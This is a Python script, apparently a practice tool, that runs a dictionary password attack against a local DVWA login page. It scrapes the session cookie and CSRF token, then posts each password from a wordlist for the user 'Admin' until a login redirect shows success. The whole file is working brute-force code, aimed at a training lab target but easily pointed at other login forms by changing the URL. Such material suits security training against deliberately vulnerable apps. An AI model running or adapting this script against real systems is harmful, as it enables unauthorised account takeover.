from bs4 import BeautifulSoup
import requests
import re

# Target URL installed locally using DVWA and XAMPP 
url = "http://127.0.0.1/dvwa/login.php" 

# get users
#user_file = “users.txt” // in case you need to read usernames from a file
#fd = open(user_file, “r”)
#users = fd.readlines()
#fd.close()
user = "Admin" # I defined only one user for testing purposes
# get passwords
password_file = "passwds.txt"  # Dictionary Attack 
fd = open(password_file, "r")
passwords = fd.readlines()
fd.close()

# Changes to True when user/pass found
done = False

print (""" 

------->>>>>>>     ATTACKING using Dictionary Attack   <<<<<<<----------                                                         
                                                                            
                   Edited by Maher Salem
                   inspired by /Antu7@github

<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>

""")
print("===>> Start Attacking the target:\t" + url + "\n")

# Get login page
try:
    r = requests.get(url, timeout=5)
except ConnectionRefusedError:
    print("Unable to reach server! Quitting!\t\t:(:(:")

# Extract session_id (next 2 lines are from https://blog.g0tmi1k.com/dvwa/login/)
session_id = re.match("PHPSESSID=(.*?);", r.headers["set-cookie"])
session_id = session_id.group(1)

#print("Session_id: " + session_id)
cookie = {"PHPSESSID": session_id}

# prepare soup
soup = BeautifulSoup(r.text, "html.parser")

# get user_token value
user_token = soup.find("input", {"name":"user_token"})["value"]

print("User_token:" + user_token + "\n")

for password in passwords:
    if not done:
        password = password.rstrip()
        #Prepare the payload to be sent to the target server
        payload = {"username":user,
                   "password": password,
                   "Login": "Login",
                   "user_token": user_token}

        reply = requests.post(url, payload, cookies=cookie, allow_redirects=False)

        result = reply.headers["Location"]
        #print the location for debugging purposes
        #print(result)

        #print("[+] ....Trying: \t" + user + ":" + password, end="\r", flush=True)
        print("[-] ....Trying: \t" + user + ":" + password)

        if "index.php" in result: # The login was success and redirected to index.php
            print("[+]██████████████████████████ W A I T ████████████████████████████████████████[+]")
            print("\n (^_^) WOW! The Username:" + user + " _and_ the Password:" + password +"....Are correct!!!\n")
            print("[+]███████████████████████████████████████████████████████████████████████████[+]")
            done = True
        else:
            print(" |---->" + password + " is a worng password")
        #break
